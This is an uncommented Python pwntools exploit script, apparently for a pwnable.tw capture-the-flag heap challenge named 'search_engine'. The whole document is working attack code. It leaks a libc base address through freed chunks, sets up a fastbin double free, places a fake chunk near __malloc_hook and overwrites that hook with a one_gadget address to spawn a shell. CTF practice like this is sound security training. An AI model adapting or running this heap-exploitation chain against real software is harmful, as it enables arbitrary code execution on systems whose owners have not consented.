from pwn import *
# challenge informatp.
context(arch='amd64',os='linux',log_level='debug')
myelf  = ELF("./search_engine")
#libc   = ELF("./libc_64.so.6")
#p     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
p = process(myelf.path)
#p = remote('chall.pwnable.tw', 10203)
# local libc
local_libc_64  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
local_libc_32  = ELF("/lib/i386-linux-gnu/libc.so.6")

# functp.s for quick script
s       = lambda data               :p.send(data)       
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims             :p.recvuntil(delims)
pa      = lambda                   :p.interactive()
# misc functp.s
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

def debug():
	gdb.attach(p)
	pause()
	#pass

def add_fake(size,cont):
	sla('3: Quit\n','2')
	sla('Enter the sentence size:\n',str(size))
	sa('Enter the sentence:\n',cont.ljust(size,'x'))

def add(size,cont):
	sla('3: Quit\n','2')
	sla('Enter the sentence size:\n',str(size))
	sa('Enter the sentence:\n',cont.rjust(size,'x'))
	

def delete(cont):
	sla('3: Quit\n','1')
	sla('Enter the word size:\n',str(len(cont)))
	sa('Enter the word:\n',cont)
	sla('Delete this sentence (y/n)?\n','y')

def show(cont):
	sla('3: Quit\n','1')
	sla('Enter the word size:\n',str(len(cont)))
	sa('Enter the word:\n',cont)


#leak libc 
add(0x88,' index0')
debug()
delete('index0')
debug()
show('\x00'*6)
p.recvuntil(': ')
libc_base = uu64(p.recv(6)) - 88 -0x3c4b20
log.success('libc_base==>'+hex(libc_base))
sla('Delete this sentence (y/n)?\n','n')
one = libc_base + 0xf1247

#alert double free
add(0x60,' index1')
add(0x60,' index2')
add(0x60,' index3')

#delete the sentence by the word 
delete('index1')
delete('index2')
delete('index3')

show('\x00'*6)
sla('Delete this sentence (y/n)?\n','n')
sla('Delete this sentence (y/n)?\n','y')
debug()

#fake chunk
fake = libc_base + local_libc_64.sym['__malloc_hook'] -0x23  
add_fake(0x60,p64(fake))
add(0x60,'pad')
add(0x60,'pad')
debug()
add_fake(0x60,'a'*0x13+p64(one))
gdb.attach(p)
p.interactive()


